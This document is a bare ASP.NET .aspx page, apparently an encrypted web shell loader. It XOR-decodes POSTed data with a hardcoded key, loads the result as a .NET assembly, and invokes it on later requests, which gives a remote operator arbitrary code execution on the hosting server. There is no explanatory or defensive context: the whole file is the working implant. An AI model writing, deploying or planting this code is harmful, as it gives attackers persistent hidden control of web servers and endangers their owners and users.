<%@ Page Language="C#" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.HttpMethod == "POST")
        {
            try
            {
                int totalBytes = Request.TotalBytes;
                if (totalBytes <= 0)
                    return;
                
                byte[] rawData = Request.BinaryRead(totalBytes);

                if (Session["k"] == null)
                {
                    Session["k"] = "be56e057f20f883e"; 
                }

                object loader = Session["nebulapulsar"];
                if (loader == null)
                {
                    byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes((string)Session["k"]);
                    for (int i = 0; i < rawData.Length; i++)
                        rawData[i] = (byte)(rawData[i] ^ keyBytes[(i + 1) & 15]);

                    Assembly asm = Assembly.Load(rawData);
                    loader = Activator.CreateInstance(asm.GetType("NebulaPulsar"));
                    Session["nebulapulsar"] = loader;
                    Response.Write("LOADER_INIT_SUCCESS");
                }
                else
                {
                    Context.Items["rawPostData"] = rawData;
                    loader.GetType().GetMethod("Equals", new Type[]{typeof(object)}).Invoke(loader, new object[]{Context});
                }
            }
            catch (Exception ex)
            {
                Response.Write("ASPX_PORT_ERROR: " + ex.Message);
            }
        }
    }
</script>